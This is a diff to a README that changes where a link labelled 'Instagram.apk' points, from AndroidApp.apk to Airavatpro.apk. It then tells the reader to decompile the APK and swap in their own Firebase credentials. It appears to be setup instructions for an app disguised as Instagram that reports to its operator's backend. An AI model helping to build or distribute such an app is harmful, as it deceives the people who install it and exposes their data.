@@ -20,7 +20,7 @@ Apk error fix 🥰
   </div>
 
  
- 1. Download [Instagram.apk](./ANDROID%20APP/AndroidApp.apk)
+ 1. Download [Instagram.apk](./ANDROID%20APP/Airavatpro.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
